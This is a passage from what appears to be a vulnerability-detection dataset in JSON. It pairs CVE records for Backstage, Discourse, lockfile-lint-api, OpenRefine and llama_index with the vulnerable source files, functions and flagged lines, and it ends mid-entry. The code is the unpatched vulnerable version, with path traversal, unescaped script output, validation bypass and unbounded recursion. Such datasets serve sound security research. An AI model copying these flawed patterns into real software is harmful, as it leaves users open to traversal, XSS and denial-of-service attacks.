    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const targetPath = resolvePath(base, path);\n\n  if (!isChildPath(base, targetPath)) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 67,
          "content": "  if (!isChildPath(base, targetPath)) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 1020,
    "cve": "CVE-2024-39320",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, the vulnerability allows an attacker to inject iframes from any domain, bypassing the intended restrictions enforced by the allowed_iframes setting. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 67,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-74",
      "CWE-1021"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 147,
    "cve": "CVE-2025-4759",
    "description": "Versions of the package lockfile-lint-api before 5.9.2 are vulnerable to Incorrect Behavior Order: Early Validation via the resolved attribute of the package URL validation which can be bypassed by extending the package name allowing an attacker to install other npm packages than the intended one.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/lockfile-lint-api/src/validators/ValidatePackageNames.js",
          "content": "'use strict'\n\nconst debug = require('debug')('lockfile-lint')\nconst {REGISTRY} = require('../common/constants')\n\nmodule.exports = class ValidatePackageNames {\n  constructor ({packages} = {}) {\n    if (typeof packages !== 'object') {\n      throw new Error('expecting an object passed to validator constructor')\n    }\n\n    this.packages = packages\n  }\n\n  validate (packageNameAliases) {\n    const validationResult = {\n      type: 'success',\n      errors: []\n    }\n\n    const packageNameAliasPairs = this._getPackageNameAliasPairs(packageNameAliases)\n\n    for (const [packageName, packageMetadata] of Object.entries(this.packages)) {\n      if (!('resolved' in packageMetadata)) {\n        continue\n      }\n\n      if (Object.hasOwn(packageNameAliasPairs, this._getPackageNameOnly(packageName))) {\n        debug(\n          `skipping package name validation for aliased package name: ${packageName} resolving to: ${\n            packageNameAliasPairs[packageName]\n          }}`\n        )\n        continue\n      }\n\n      try {\n        const packageResolvedURL = new URL(packageMetadata.resolved)\n\n        // Only handle package name validation matching per registry URL\n        // when the registry is one of the official public registries:\n        if (!Object.values(REGISTRY).includes(packageResolvedURL.host)) {\n          debug(\n            `skipping package name '${packageName}' validation for non-official registry '${\n              packageResolvedURL.origin\n            }'`\n          )\n          continue\n        }\n\n        const path = packageResolvedURL.pathname\n        const packageNameFromResolved = path.split('/-/')[0].slice(1)\n\n        const packageNameOnly = this._getPackageNameOnly(packageName)\n\n        const expectedURLBeginning = `${packageResolvedURL.origin}/${packageNameOnly}`\n\n        const isPassing = packageMetadata.resolved.startsWith(expectedURLBeginning)\n        if (!isPassing) {\n          validationResult.errors.push({\n            message: `detected resolved URL for package with a different name: ${packageNameOnly}\\n    expected: ${packageNameOnly}\\n    actual: ${packageNameFromResolved}\\n`,\n            package: packageNameOnly\n          })\n        }\n      } catch (error) {\n        // swallow error (assume that the version is correct)\n      }\n    }\n\n    if (validationResult.errors.length !== 0) {\n      validationResult.type = 'error'\n    }\n\n    return validationResult\n  }\n\n  _getPackageNameOnly (packageName) {\n    // Remove versioning info from packageName. The @ sign is the delimiter, but could also be the\n    // first character of a scoped package name. We handle this edge-case here.\n    const packageNameOnly = packageName.startsWith('@')\n      ? `@${packageName.slice(1).split('@')[0]}`\n      : packageName.split('@')[0]\n\n    return packageNameOnly\n  }\n\n  _getPackageNameAliasPairs (packageNameAliases) {\n    if (!packageNameAliases || !Array.isArray(packageNameAliases)) {\n      return {}\n    }\n\n    const packageNameAliasPairs = {}\n    for (const packageNameAlias of packageNameAliases) {\n      const [packageName, aliasedPackageName] = packageNameAlias.split(':')\n      packageNameAliasPairs[packageName] = aliasedPackageName\n    }\n\n    return packageNameAliasPairs\n  }\n}\n"
        }
      ],
      "method_level": [
        "validate (packageNameAliases) {\n    const validationResult = {\n      type: 'success',\n      errors: []\n    }\n\n    const packageNameAliasPairs = this._getPackageNameAliasPairs(packageNameAliases)\n\n    for (const [packageName, packageMetadata] of Object.entries(this.packages)) {\n      if (!('resolved' in packageMetadata)) {\n        continue\n      }\n\n      if (Object.hasOwn(packageNameAliasPairs, this._getPackageNameOnly(packageName))) {\n        debug(\n          `skipping package name validation for aliased package name: ${packageName} resolving to: ${\n            packageNameAliasPairs[packageName]\n          }}`\n        )\n        continue\n      }\n\n      try {\n        const packageResolvedURL = new URL(packageMetadata.resolved)\n\n        // Only handle package name validation matching per registry URL\n        // when the registry is one of the official public registries:\n        if (!Object.values(REGISTRY).includes(packageResolvedURL.host)) {\n          debug(\n            `skipping package name '${packageName}' validation for non-official registry '${\n              packageResolvedURL.origin\n            }'`\n          )\n          continue\n        }\n\n        const path = packageResolvedURL.pathname\n        const packageNameFromResolved = path.split('/-/')[0].slice(1)\n\n        const packageNameOnly = this._getPackageNameOnly(packageName)\n\n        const expectedURLBeginning = `${packageResolvedURL.origin}/${packageNameOnly}`\n\n        const isPassing = packageMetadata.resolved.startsWith(expectedURLBeginning)\n        if (!isPassing) {\n          validationResult.errors.push({\n            message: `detected resolved URL for package with a different name: ${packageNameOnly}\\n    expected: ${packageNameOnly}\\n    actual: ${packageNameFromResolved}\\n`,\n            package: packageNameOnly\n          })\n        }\n      } catch (error) {\n        // swallow error (assume that the version is correct)\n      }\n    }\n\n    if (validationResult.errors.length !== 0) {\n      validationResult.type = 'error'\n    }\n\n    return validationResult\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 56,
          "content": "        const expectedURLBeginning = `${packageResolvedURL.origin}/${packageNameOnly}`"
        }
      ]
    },
    "cwe": [
      "CWE-179"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_version": 4.0
  },
  {
    "id": 1016,
    "cve": "CVE-2024-37299",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, crafting requests to submit very long tag group names can reduce the availability of a Discourse instance. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 67,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.9,
    "cvss_version": 3.1
  },
  {
    "id": 1256,
    "cve": "CVE-2024-47878",
    "description": "OpenRefine is a free, open source tool for working with messy data. Prior to version 3.8.3, the `/extension/gdata/authorized` endpoint includes the `state` GET parameter verbatim in a `<script>` tag in the output, so without escaping. An attacker could lead or redirect a user to a crafted URL containing JavaScript code, which would then cause that code to be executed in the victim's browser as if it was part of OpenRefine. Version 3.8.3 fixes this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "extensions/gdata/module/MOD-INF/controller.js",
          "content": "/*\n\nCopyright 2010, Google Inc.\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n * Redistributions of source code must retain the above copyright\nnotice, this list of conditions and the following disclaimer.\n * Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the following disclaimer\nin the documentation and/or other materials provided with the\ndistribution.\n * Neither the name of Google Inc. nor the names of its\ncontributors may be used to endorse or promote products derived from\nthis software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,           \nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY           \nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n */\n\n/*\n * Controller for GData extension.\n * \n * This is run in the Butterfly (ie Refine) server context using the Rhino\n * Javascript interpreter.\n */\n\nvar html = \"text/html\";\nvar encoding = \"UTF-8\";\nvar version = \"0.3\";\nvar ClientSideResourceManager = Packages.com.google.refine.ClientSideResourceManager;\n\n/*\n * Function invoked to initialize the extension.\n */\nfunction init() {\n  var RS = Packages.com.google.refine.RefineServlet;\n  RS.registerCommand(module, \"deauthorize\", Packages.com.google.refine.extension.gdata.DeAuthorizeCommand());\n  RS.registerCommand(module, \"upload\", Packages.com.google.refine.extension.gdata.UploadCommand());\n\n  // Register importer and exporter\n  var IM = Packages.com.google.refine.importing.ImportingManager;\n  \n  IM.registerController(\n    module,\n    \"gdata-importing-controller\",\n    new Packages.com.google.refine.extension.gdata.GDataImportingController()\n  );\n  \n  // Script files to inject into /index page\n  ClientSideResourceManager.addPaths(\n    \"index/scripts\",\n    module,\n    [\n      \"scripts/gdata-extension.js\",\n      \"scripts/index/importing-controller.js\",\n      \"scripts/index/gdata-source-ui.js\"\n    ]\n  );\n  // Style files to inject into /index page\n  ClientSideResourceManager.addPaths(\n    \"index/styles\",\n    module,\n    [\n      \"styles/importing-controller.css\"\n    ]\n  );\n  \n  // Script files to inject into /project page\n  ClientSideResourceManager.addPaths(\n    \"project/scripts\",\n    module,\n    [\n      \"scripts/gdata-extension.js\",\n      \"scripts/project/exporters.js\"\n    ]\n  );\n}\n\n/*\n * Function invoked to handle each request in a custom way.\n */\nfunction process(path, request, response) {\n  // Analyze path and handle this request yourself.\n  if (path == \"authorize\") {\n    var context = {};\n    context.authorizationUrl = Packages.com.google.refine.extension.gdata.GoogleAPIExtension.getAuthorizationUrl(module, request);\n    \n    send(request, response, \"authorize.vt\", context);\n  } else if (path == \"authorized\") {\n    var context = {};\n    context.state = request.getParameter(\"state\");\n    \n    (function() {\n      if (Packages.com.google.refine.extension.gdata.TokenCookie.getToken(request) !== null) {\n          return;\n      }\n      var tokenAndExpiresInSeconds =  Packages.com.google.refine.extension.gdata.GoogleAPIExtension.getTokenFromCode(module,request);\n      if (tokenAndExpiresInSeconds) {\n        var tokenInfo = tokenAndExpiresInSeconds.split(\",\");\n        Packages.com.google.refine.extension.gdata.TokenCookie.setToken(request, response, tokenInfo[0], tokenInfo[1]);\n        return;\n      }\n      Packages.com.google.refine.extension.gdata.TokenCookie.deleteToken(request, response);\n    })();\n    \n    send(request, response, \"authorized.vt\", context);\n  } else if (path == \"/\" || path == \"\") {\n      var context = {};\n      context.version = version;\n      send(request, response, \"index.vt\", context);\n  } \n}\n\nfunction send(request, response, template, context) {\n  butterfly.sendTextFromTemplate(request, response, context, template, encoding, html);\n}\n"
        }
      ],
      "method_level": [
        "function process(path, request, response) {\n  // Analyze path and handle this request yourself.\n  if (path == \"authorize\") {\n    var context = {};\n    context.authorizationUrl = Packages.com.google.refine.extension.gdata.GoogleAPIExtension.getAuthorizationUrl(module, request);\n    \n    send(request, response, \"authorize.vt\", context);\n  } else if (path == \"authorized\") {\n    var context = {};\n    context.state = request.getParameter(\"state\");\n    \n    (function() {\n      if (Packages.com.google.refine.extension.gdata.TokenCookie.getToken(request) !== null) {\n          return;\n      }\n      var tokenAndExpiresInSeconds =  Packages.com.google.refine.extension.gdata.GoogleAPIExtension.getTokenFromCode(module,request);\n      if (tokenAndExpiresInSeconds) {\n        var tokenInfo = tokenAndExpiresInSeconds.split(\",\");\n        Packages.com.google.refine.extension.gdata.TokenCookie.setToken(request, response, tokenInfo[0], tokenInfo[1]);\n        return;\n      }\n      Packages.com.google.refine.extension.gdata.TokenCookie.deleteToken(request, response);\n    })();\n    \n    send(request, response, \"authorized.vt\", context);\n  } else if (path == \"/\" || path == \"\") {\n      var context = {};\n      context.version = version;\n      send(request, response, \"index.vt\", context);\n  } \n}"
      ],
      "hunk_level": [
        {
          "line_no": 104,
          "content": "    var context = {};"
        },
        {
          "line_no": 105,
          "content": "    context.state = request.getParameter(\"state\");"
        },
        {
          "line_no": 106,
          "content": "    "
        },
        {
          "line_no": 107,
          "content": "    (function() {"
        },
        {
          "line_no": 108,
          "content": "      if (Packages.com.google.refine.extension.gdata.TokenCookie.getToken(request) !== null) {"
        },
        {
          "line_no": 109,
          "content": "          return;"
        },
        {
          "line_no": 110,
          "content": "      }"
        },
        {
          "line_no": 111,
          "content": "      var tokenAndExpiresInSeconds =  Packages.com.google.refine.extension.gdata.GoogleAPIExtension.getTokenFromCode(module,request);"
        },
        {
          "line_no": 112,
          "content": "      if (tokenAndExpiresInSeconds) {"
        },
        {
          "line_no": 113,
          "content": "        var tokenInfo = tokenAndExpiresInSeconds.split(\",\");"
        },
        {
          "line_no": 114,
          "content": "        Packages.com.google.refine.extension.gdata.TokenCookie.setToken(request, response, tokenInfo[0], tokenInfo[1]);"
        },
        {
          "line_no": 115,
          "content": "        return;"
        },
        {
          "line_no": 116,
          "content": "      }"
        },
        {
          "line_no": 117,
          "content": "      Packages.com.google.refine.extension.gdata.TokenCookie.deleteToken(request, response);"
        },
        {
          "line_no": 118,
          "content": "    })();"
        },
        {
          "line_no": 119,
          "content": "    "
        },
        {
          "line_no": 120,
          "content": "    send(request, response, \"authorized.vt\", context);"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 138,
    "cve": "CVE-2025-1752",
    "description": "A Denial of Service (DoS) vulnerability has been identified in the KnowledgeBaseWebReader class of the run-llama/llama_index project, affecting version ~ latest(v0.12.15). The vulnerability arises due to inappropriate secure coding measures, specifically the lack of proper implementation of the max_depth parameter in the get_article_urls function. This allows an attacker to exhaust Python's recursion limit through repeated function calls, leading to resource consumption and ultimately crashing the Python process.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/knowledge_base/base.py",
          "content": "from typing import Any, Dict, List, Optional\n\nfrom llama_index.core.readers.base import BaseReader\nfrom llama_index.core.schema import Document\n\n\nclass KnowledgeBaseWebReader(BaseReader):\n    \"\"\"\n    Knowledge base reader.\n\n    Crawls and reads articles from a knowledge base/help center with Playwright.\n    Tested on Zendesk and Intercom CMS, may work on others.\n    Can be run in headless mode but it may be blocked by Cloudflare. Run it headed to be safe.\n    Times out occasionally, just increase the default time out if it does.\n    Requires the `playwright` package.\n\n    Args:\n        root_url (str): the base url of the knowledge base, with no trailing slash\n            e.g. 'https://support.intercom.com'\n        link_selectors (List[str]): list of css selectors to find links to articles while crawling\n            e.g. ['.article-list a', '.article-list a']\n        article_path (str): the url path of articles on this domain so the crawler knows when to stop\n            e.g. '/articles'\n        title_selector (Optional[str]): css selector to find the title of the article\n            e.g. '.article-title'\n        subtitle_selector (Optional[str]): css selector to find the subtitle/description of the article\n            e.g. '.article-subtitle'\n        body_selector (Optional[str]): css selector to find the body of the article\n            e.g. '.article-body'\n    \"\"\"\n\n    def __init__(\n        self,\n        root_url: str,\n        link_selectors: List[str],\n        article_path: str,\n        title_selector: Optional[str] = None,\n        subtitle_selector: Optional[str] = None,\n        body_selector: Optional[str] = None,\n        max_depth: int = 100,\n    ) -> None:\n        \"\"\"Initialize with parameters.\"\"\"\n        self.root_url = root_url\n        self.link_selectors = link_selectors\n        self.article_path = article_path\n        self.title_selector = title_selector\n        self.subtitle_selector = subtitle_selector\n        self.body_selector = body_selector\n        self.max_depth = max_depth\n\n    def load_data(self) -> List[Document]:\n        \"\"\"Load data from the knowledge base.\"\"\"\n        from playwright.sync_api import sync_playwright\n\n        with sync_playwright() as p:\n            browser = p.chromium.launch(headless=False)\n\n            # Crawl\n            article_urls = self.get_article_urls(\n                browser, self.root_url, self.root_url, self.max_depth\n            )\n\n            # Scrape\n            documents = []\n            for url in article_urls:\n                article = self.scrape_article(\n                    browser,\n                    url,\n                )\n                extra_info = {\n                    \"title\": article[\"title\"],\n                    \"subtitle\": article[\"subtitle\"],\n                    \"url\": article[\"url\"],\n                }\n                documents.append(Document(text=article[\"body\"], extra_info=extra_info))\n\n            browser.close()\n\n            return documents\n\n    def scrape_article(\n        self,\n        browser: Any,\n        url: str,\n    ) -> Dict[str, str]:\n        \"\"\"\n        Scrape a single article url.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            url (str): URL of the article to scrape.\n\n        Returns:\n            Dict[str, str]: a mapping of article attributes to their values.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(url, wait_until=\"domcontentloaded\")\n\n        title = (\n            (\n                page.query_selector(self.title_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.title_selector\n            else \"\"\n        )\n        subtitle = (\n            (\n                page.query_selector(self.subtitle_selector).evaluate(\n                    \"node => node.innerText\"\n                )\n            )\n            if self.subtitle_selector\n            else \"\"\n        )\n        body = (\n            (page.query_selector(self.body_selector).evaluate(\"node => node.innerText\"))\n            if self.body_selector\n            else \"\"\n        )\n\n        page.close()\n        print(\"scraped:\", url)\n        return {\"title\": title, \"subtitle\": subtitle, \"body\": body, \"url\": url}\n\n    def get_article_urls(\n        self, browser: Any, root_url: str, current_url: str, max_depth: int = 100\n    ) -> List[str]:\n        \"\"\"\n        Recursively crawl through the knowledge base to find a list of articles.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            root_url (str): root URL of the knowledge base.\n            current_url (str): current URL that is being crawled.\n\n        Returns:\n            List[str]: a list of URLs of found articles.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(current_url, wait_until=\"domcontentloaded\")\n\n        # If this is a leaf node aka article page, return itself\n        if self.article_path in current_url:\n            print(\"Found an article: \", current_url)\n            page.close()\n            return [current_url]\n\n        # Otherwise crawl this page and find all the articles linked from it\n        article_urls = []\n        links = []\n\n        for link_selector in self.link_selectors:\n            ahrefs = page.query_selector_all(link_selector)\n            links.extend(ahrefs)\n\n        for link in links:\n            url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n            article_urls.extend(\n                self.get_article_urls(browser, root_url, url, max_depth)\n            )\n\n        page.close()\n\n        return article_urls\n"
        }
      ],
      "method_level": [
        "def get_article_urls(\n        self, browser: Any, root_url: str, current_url: str, max_depth: int = 100\n    ) -> List[str]:\n        \"\"\"\n        Recursively crawl through the knowledge base to find a list of articles.\n\n        Args:\n            browser (Any): a Playwright Chromium browser.\n            root_url (str): root URL of the knowledge base.\n            current_url (str): current URL that is being crawled.\n\n        Returns:\n            List[str]: a list of URLs of found articles.\n\n        \"\"\"\n        page = browser.new_page(ignore_https_errors=True)\n        page.set_default_timeout(60000)\n        page.goto(current_url, wait_until=\"domcontentloaded\")\n\n        # If this is a leaf node aka article page, return itself\n        if self.article_path in current_url:\n            print(\"Found an article: \", current_url)\n            page.close()\n            return [current_url]\n\n        # Otherwise crawl this page and find all the articles linked from it\n        article_urls = []\n        links = []\n\n        for link_selector in self.link_selectors:\n            ahrefs = page.query_selector_all(link_selector)\n            links.extend(ahrefs)\n\n        for link in links:\n            url = root_url + page.evaluate(\"(node) => node.getAttribute('href')\", link)\n            article_urls.extend(\n                